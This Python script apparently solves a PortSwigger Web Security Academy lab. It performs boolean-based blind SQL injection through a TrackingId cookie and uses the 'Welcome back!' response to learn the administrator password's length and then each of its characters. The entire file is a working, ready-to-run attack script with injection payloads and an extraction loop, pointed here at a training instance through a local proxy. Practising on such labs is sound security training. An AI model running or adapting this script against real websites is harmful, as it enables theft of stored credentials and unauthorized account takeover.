import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Values depend on the challenge
TrackingId = "oFOrORCFGn8P7Zin"
session = "KqJ3aCy4q95DZ73U5zsmxZAOAP9ASgMI"

url = "https://0a5400fe03e17ccd81379db6001f00ed.web-security-academy.net/"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def get_password_length():
    print("(+) Getting password length")
    for i in range(1, 100):
        payload = f"' and (select LENGTH(password) from users where username='administrator')={i} -- -"
        value = TrackingId + payload
        cookies = {"TrackingId": value, "session": session}
        req = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        if "Welcome back!" in req.text:
            print(f"Password length is {i}")
            return i


def get_password(password_length):
    print("(+) Getting Password")
    password = ""
    for j in range(1, password_length + 1):
        for i in range(32, 127):  # ASCII range
            payload = f"' and (select substring(password, {j}, 1) from users where username='administrator')='{chr(i)}' -- -"
            value = TrackingId + payload
            cookies = {
                "TrackingId": value,
                "session": session,
            }
            req = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome back!" in req.text:
                password += chr(i)
                break
    print(f"Password: {password}")
    return password


if __name__ == "__main__":
    print("Start of main function")
    password_length = get_password_length()
    password = get_password(password_length)
    print("End of main function")
